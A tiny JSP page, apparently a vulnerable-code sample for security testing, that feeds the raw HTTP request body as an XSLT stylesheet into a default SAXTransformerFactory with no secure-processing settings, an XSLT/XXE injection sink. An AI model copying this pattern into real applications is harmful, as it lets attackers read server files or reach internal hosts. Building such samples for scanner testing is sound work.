<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.xml.transform.sax.SAXTransformerFactory" %>
<%@ page import="javax.xml.transform.stream.StreamSource" %>
<%
    SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
    StreamSource source = new StreamSource(request.getInputStream());
    sf.newTransformerHandler(source);
%>